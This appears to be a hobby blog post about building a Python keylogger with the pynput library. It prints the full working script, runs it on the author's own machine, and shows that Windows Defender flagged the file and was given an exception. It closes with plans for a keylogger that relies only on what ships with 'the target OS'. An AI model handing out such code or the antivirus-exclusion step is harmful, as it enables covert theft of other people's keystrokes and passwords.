---
title: "Making a Keylogger"
date: 2022-04-14
categories: Projects
---

The *keylogger*. The big, bad, sinister program responsible for stealing all your login credentials and, subsequently, your information. Many criminals or those with criminal intent will sometimes call upon the use of a program such as this in a bid to gain access to a network or computer system. For the uninitied, the task of creating and deploying a keylogger may seem like a complicated task but, in reality, it's actually quite simple to get one up and running.

Before we begin, I must give credit to **CyberFault** who made the [YouTube video](https://www.youtube.com/watch?v=QuH_9OGrVt4) in which I discovered this idea for a project from and **Himanshu Tyagi**, who authored [the initial post referenced in CyberFault's video](https://www.codeitbro.com/how-to-create-keylogger-in-python/).

***

Now, I'll be honest: at the time of writing this post, I don't really know anything about making a keylogger, much less creating one in Python (even though I am a little bit familiar with the coding language). But, one doesn't need programming knowledge or skills in order to make something. A little technical and computer know-how goes a long way.

Since Tyagi's post already covers how to setup one's computer with Python libraries, I won't go into that. However, here's the code that I'll be using:

```
{
import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Users/<username>"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
}
```

Right off the bat, there are two fields of interest that would change how and where the output file from this script is saved to:

* `log_dir = r"C:/Users/<username>"`
* `(log_dir + "keyLog.txt")`

The first piece of code tells the script where to save to while the second tells it what filename and extension to use. Both of these can be changed to whatever but, since I just want to try out the code, I'll modify the directory to match my machine's and allow the file to be written as `keyLog.txt`. Whether in a text editor or an IDE, the next thing is to save this script. I'll give it the inconspicious name of `Keylogger.py`.

![Uh oh](/blastermans-base/assets/images/projects/keylogger/windefendercatch.png)

Let's see what this is:

![WindefenderDesc](/blastermans-base/assets/images/projects/keylogger/windefenderdesc.png)

😂

Seems like Windows Defender thinks the file is malicious so I'll need to make an exception for it.

***

With that saved (and excluded from the antivirus), it's time to run the program. This can be done by simply navigating to the script's directory and executing it through Python:

`py.exe .\Keylogger.py`

Now the file running in the terminal. Since it's capturing my keystrokes, the only thing remaining is to type!

***

After a while of typing, let's see what happened:

![Logfile found](/blastermans-base/assets/images/projects/keylogger/logfiledirectory.png)

Neato. The output log was saved the specified directory. What's inside?

![Tada](/blastermans-base/assets/images/projects/keylogger/keylog.png)

And there we have it. All of my keystrokes were recorded and saved to this text file. From it, I can see what character or command was pressed was captured and the time it was sent. Pretty cool stuff. 😎

***

Admittedly, while I was able to successfully create, run, and view the results of this Python keylogger, it relies on Python libraries that must be already by installed on the target computer. However, it was fun making this script to test and see in action a program that actively records every keystroke sent by the user. 

In the future, I work on making a keylogger that doesn't rely on extra libraries or binaries but instead utilizes programming that comes bundled with the target OS. That would be a more independent program than this one and, thus, more awesome. With that, it's onto the next project...


Thanks for reading!